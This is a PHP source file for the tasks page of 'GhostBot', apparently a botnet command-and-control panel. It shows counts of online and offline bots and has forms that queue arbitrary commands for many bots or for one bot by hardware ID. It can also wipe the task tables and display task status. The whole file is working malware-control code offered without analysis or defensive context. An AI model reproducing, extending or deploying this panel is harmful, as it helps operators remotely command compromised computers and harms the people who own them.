<?php
	require_once('config.php');
	require_once('session.php');
	// bots online
	$online_q = "select count(*) from bots where time > (now() + interval -3 minute);";
	$online_results = mysql_query($online_q);
	while($row=mysql_fetch_assoc($online_results))
	{
		$onlineyn = $row['count(*)'];
	}
	// total bots
	$total_q = "select count(*) from bots ;";
	$total_results = mysql_query($total_q);
	while($row=mysql_fetch_assoc($total_results))
	{
		$totalcount = $row['count(*)'];
	}
	// bots offline
	$offline = abs($onlineyn - $totalcount);
	
?>

<!doctype html>
<html>
	<head>
	<title>GhostBot</title>
	<link  type="text/css" rel="stylesheet" href="ghostbot.css" />
	</head>
	<body>
		
		
		
		<header>
			<img src="logo.png" alt="logo pic">
		</header>
		<ul class="vnav">
		  <li><a href="list.php">Bots</a></li>
		  <li><a href="tasks.php">Tasks</a></li>
		  <li style="float:right"><a class="active" href="logout.php">Log Out</a></li>
		  
		</ul>
		<div id="left">
			<p><?php echo "Total: $totalcount"; ?></p>
			<p><?php echo "Online: <span id='green'>$onlineyn</span>"; ?><p>
			<p><?php echo "Offline: <span id='red'>$offline</span>"; ?></p>
			
		</div>
		<div id="main" >
			<div id = "center">
				
				<h2>Schedule Tasks</h2>
				<div>
					<form  method="post" action="tasks.php" >
						  <input type="text" name="command" id="search"  placeholder="Command.......">
						  <input type="text" name="complete" id="search"  placeholder="Number of Bots to complete">
						  <input  type="submit" name="submit" value="Schedule" id="button">
						  
					</form>
				</div>
				<br/>
				<div>
					<form  method="post" action="tasks.php" >
						  <input type="text" name="mycommand" id="search"  placeholder="Command.......">
						  <input type="text" name="hwid" id="search"  placeholder="Enter HWID of bot">
						  <input  type="submit" name="submit" value="Schedule" id="button">
						  
					</form>
				</div>
				<br/>
				<h2>Delete All Tasks</h2>
				<div>
					<form  method="post" action="tasks.php" >
						  <input type="text" id="search" name="drop"  placeholder="Type DROP.......">
						  <input  type="submit" name="submit" value="Delete Tasks" id="button">
						  
					</form>
				</div>
				
				
				<?php
					require_once('config.php');
					if (isset($_POST["drop"]))
					{
							$drop  = $_POST["drop"];
							if($drop == "DROP")
							{
								$drop_q = "truncate tasks;";
								$drop_q2 = "truncate tasks_done;";
								$drop_q3 = "truncate my_tasks;";
								mysql_query($drop_q);
								mysql_query($drop_q2);
								mysql_query($drop_q3);
								
							}
					}
					if (isset($_POST["command"]))
					{
						$schedulecommand  = $_POST["command"];
						$schedulecommand = mysql_real_escape_string($schedulecommand); // block sqli
						$tocomplete  = $_POST["complete"];
						$tocomplete = mysql_real_escape_string($tocomplete); //block sqli
						$schedule_task = "insert into tasks (`command`,`wantComplete`) values ('$schedulecommand','$tocomplete');";
						mysql_query($schedule_task);
						
					}
					if (isset($_POST["mycommand"]))
					{
						$schedulecommand  = $_POST["mycommand"];
						$schedulecommand = mysql_real_escape_string($schedulecommand); // block sqli
						$hwid  = $_POST["hwid"];
						$hwid = mysql_real_escape_string($hwid); //block sqli
						$schedule_task = "insert into my_tasks (`command`,`hwid`) values ('$schedulecommand','$hwid') ;";
						mysql_query($schedule_task);
						
					}
					
					// dsiplay tasks for all bots
					$q = "select * from tasks";
					$results = mysql_query($q);
					if(mysql_num_rows($results))
					{
						echo "<table>";
						echo "<tr><th>Command</th><th>Completed</th><th>Want Completed</th></tr>";
					}
					while($row=mysql_fetch_assoc($results))
					{
						$command = $row['command'];
						$command = htmlentities($command); //block xss
						$complete =$row['complete'];
						$complete = htmlentities($complete); //block xss
						$wantComplete =$row['wantComplete'];
						$wantComplete = htmlentities($wantComplete);
						echo "<tr>";
						echo "<td >$command</td>";
						echo "<td >$complete </td>"  ; 
						echo "<td > $wantComplete </td>"  ;
						echo "</tr>";
					}
					echo "</table>"; 
					
					// display specific tasks
					$q2 = "select * from my_tasks";
					$results2 = mysql_query($q2);
					if(mysql_num_rows($results2))
					{
						echo "<table>"; 
						echo "<tr><th>Command</th><th>HWID</th><th>Done</th></tr>";
					}
					while($row=mysql_fetch_assoc($results2))
					{
						$command = $row['command'];
						$command = htmlentities($command); //block xss
						$hwid =$row['hwid'];
						$hwid = htmlentities($hwid); //block xss
						$done =$row['done'];
						$done = htmlentities($done);
						echo "<tr>";
						echo "<td >$command</td>";
						echo "<td >$hwid </td>"  ; 
						echo "<td > $done </td>"  ;
						echo "</tr>";
					}
					echo "</table>"; 
				?>
			</div>
		</div>
	</body>
</html>